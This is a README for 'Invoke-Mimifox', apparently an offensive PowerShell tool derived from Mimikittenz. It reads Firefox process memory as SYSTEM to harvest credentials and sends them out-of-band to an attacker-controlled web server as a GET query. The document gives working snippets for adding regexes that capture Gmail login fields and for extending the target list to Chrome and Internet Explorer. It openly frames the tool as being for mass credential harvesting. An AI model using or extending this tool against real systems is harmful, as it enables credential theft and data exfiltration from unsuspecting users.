# Invoke-Mimifox
    ./Invoke-Mimifox.ps1 invoke-mimifox
![alt](https://i.imgur.com/8eEmUjR.png)

The year is 2020 and alas no longer Mimikittenz works well or progressively on any machines in a real work environment. Mimifox is a little bit more future friendly, a couple of edits to the original code and an added OOB exfiltration option makes life a little easier for mass cred harvesting and blind PS attacks. Read the memory of a user process as system, and steal all of the creds.

## Out Of Bounds Exfil
Just set a webserver running on port 80 and be sure to change the IP addresses in the source code to your attacking IP. Basically just forces a get request with the standard out of the programme and appends `/?<all of your goodness>`. Tail the logs and viola!

## Adding Custom Regexes & Processes
    [mimikittenz.MemProcInspector]::AddRegex("Gmail","identifierInput=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)&password=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)")
Use something like Burp or tamperdata to gather the parameters passed when logging into a certain application and pass them in this format within the source. Currently only grabs Gmail and Github creds but the possiblities are..  _**Endless**_

The currently searched processes are defined within:

    $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("firefox")

You can change this to incorpate more cote-du-jour browsers or processes of choice:

    $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("firefox","chrome","iexplore","meincraft")

